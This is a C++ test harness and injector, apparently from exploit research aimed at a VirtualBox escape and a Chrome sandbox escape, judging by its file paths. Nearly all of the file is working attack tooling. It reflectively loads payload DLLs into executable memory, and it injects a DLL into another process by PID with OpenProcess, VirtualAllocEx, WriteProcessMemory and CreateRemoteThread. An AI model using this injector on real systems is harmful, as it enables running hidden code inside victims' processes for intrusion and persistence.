// payload_test.cpp : Defines the entry point for the console application.
//

#include <Windows.h>
#include <cstdio>
#include <string>
#include <iostream>
#include <fstream>
using namespace std;

const char* dll = "C:\\files\\vbox\\bpbescape\\payload\\x64\\Debug\\payload.dll";
const char* size_fname = "C:\\files\\vbox\\bpbescape\\payload\\x64\\Debug\\payload.dll.txt";

typedef void(*f_loader)(UINT_PTR);
typedef void(*f_void)();

string GetLastErrorAsString() {
	//Get the error message, if any.
	DWORD errorMessageID = ::GetLastError();
	if (errorMessageID == 0)
		return string(); //No error message has been recorded

	LPSTR messageBuffer = nullptr;
	size_t size = FormatMessageA(FORMAT_MESSAGE_ALLOCATE_BUFFER | FORMAT_MESSAGE_FROM_SYSTEM | FORMAT_MESSAGE_IGNORE_INSERTS,
		NULL, errorMessageID, MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT), (LPSTR)&messageBuffer, 0, NULL);

	string message(messageBuffer, size);

	//Free the buffer.
	LocalFree(messageBuffer);

	return message;
}
extern "C" {
	DWORD GetLoaderOffset(VOID * lpReflectiveDllBuffer);
}

void test_loader(const char* dll) {
	FILE* f;
	fopen_s(&f, dll, "rb");
	char* buf = (char*)VirtualAlloc(0, 0x100000, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	fread(buf, 1, 0x100000, f);

	DWORD offset = GetLoaderOffset(buf);
	printf("offset @ %x\n", offset);

	f_void loader = (f_void)(buf + offset);
	printf("offset %x, loader @ %p\n", offset, loader);
	getchar();
	loader();
}

void test_payload(const char* dll) {
	HMODULE mod = LoadLibraryA(dll);
	f_void payload = (f_void)GetProcAddress(mod, "payload");
	payload();
}

int inject(int argc, char** argv) {
	if (argc < 3) {
		fprintf(stderr, "Usage: %s <dll> <pid>\n", argv[0]);
		return 1;
	}
	const char* dll = argv[1];
	int pid = atoi(argv[2]);

	printf("Injecting %s into %d\n", dll, pid);

	string buf;
	{
		ifstream f(dll, std::ifstream::ate | ios::binary);
		buf.resize(f.tellg());
		printf("Reading %llu bytes\n", buf.size());
		f.seekg(0, f.beg);
		f.read(&buf[0], buf.size());
		if (!f) {
			cerr << "Failed to read file" << endl;
			return 1;
		}
	}

	// Brutal hack to fix memcpy import (which is the only C++ runtime import we really need)
	size_t fix = buf.find("VCRUNTIME140.dll");
	if (fix == string::npos) {
		cerr << "Could not find VCRUNTIME140 import" << endl;
		return 1;
	}
	printf("Fixing import at offset %x\n", fix);
	memcpy(&buf[fix], "ntdll.dll\0\0", 11);

	size_t offset = GetLoaderOffset((void*)buf.data());
	printf("ReflectiveLoader at offset %x\n", offset);

	HANDLE proc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
	if (!proc) {
		cerr << "Could not open process: " << GetLastErrorAsString() << endl;
		return 1;
	}

	printf("Process: %d\n", proc);

	LPVOID remotebuf = (LPVOID)VirtualAllocEx(proc, NULL, (buf.size() + 0xfff) & ~0xfff, MEM_RESERVE | MEM_COMMIT, 
											PAGE_EXECUTE_READWRITE);
	if (!remotebuf) {
		cerr << "Could not allocate memory: " << GetLastErrorAsString() << endl;
		return 1;
	}

	printf("Memory allocated @ %p\n", remotebuf);
	if (!WriteProcessMemory(proc, remotebuf, buf.data(), buf.size(), NULL)) {
		cerr << "Could not write memory: " << GetLastErrorAsString() << endl;
		return 1;
	}

	void* entry = (void*)((char*)remotebuf + offset);
	printf("Entry point @ %p\n", entry);
	getchar();

	if (!CreateRemoteThread(proc, NULL, NULL, (LPTHREAD_START_ROUTINE)entry, 0, NULL, NULL)) {
		cerr << "Could not create thread: " << GetLastErrorAsString() << endl;
		return 1;
	}
	return 0;
}

typedef __declspec(dllexport) UINT_PTR (*f_Loader)(void* addr, void* param);
typedef void (*f_noargs)();
f_Loader pLoader;

//__declspec(dllimport) UINT_PTR WINAPI Loader(void* addr, void* param);

int test() {
	const char* payload = "C:\\Users\\niklas\\chrome_hacks\\chromesbx\\inject\\payload\\x64\\Release\\payload2.dll";
	const char* loader = "C:\\Users\\niklas\\chrome_hacks\\chromesbx\\inject\\payload\\x64\\Release\\payload.dll";


	string buf;
	{
		ifstream f(payload, std::ifstream::ate | ios::binary);
		if (!f) {
			cerr << "Could not open DLL" << endl;
			return 1;
		}
		buf.resize(f.tellg());
		printf("Reading %llu bytes\n", buf.size());
		f.seekg(0, f.beg);
		f.read(&buf[0], buf.size());
		if (!f) {
			cerr << "Failed to read file" << endl;
			return 1;
		}
	}

	size_t offset = GetLoaderOffset((void*)buf.data());
	printf("ReflectiveLoader at offset %x\n", offset);


	LPVOID exec = (LPVOID)VirtualAlloc(NULL, (buf.size() + 0xfff) & ~0xfff, MEM_RESERVE | MEM_COMMIT,
		PAGE_EXECUTE_READWRITE);
	memcpy(exec, buf.data(), buf.size());

	//Loader(exec, 0);
	//((f_noargs)((char*)exec+offset))();
	
	HMODULE h = LoadLibraryA(loader);
	pLoader = (f_Loader)GetProcAddress(h, "Loader");
	printf("pLoader @ %p\n", pLoader);
	pLoader((void*)buf.data(), 0);
	

	return 0;
}

int main(int argc, char** argv)
{
	if (argc < 2) {
		return test();
	} else {
		return inject(argc, argv);
	}
	/*
	HMODULE lib = LoadLibraryA(payload);
	uintptr_t loader = (uintptr_t)GetProcAddress(lib, "ReflectiveLoader");
	long long offset = (long long )loader - (long long)lib;
	printf("%llx %llx %llx\n", lib, loader, offset);
	((f_void)loader)();
	*/

	//copy_loader();
	//test_payload(dll);
	/*
	if (argc > 1)
		test_loader(argv[1]);
	else
		test_loader(dll);
		//*/
	//payload();


	//Sleep(1000);
	//getchar();
}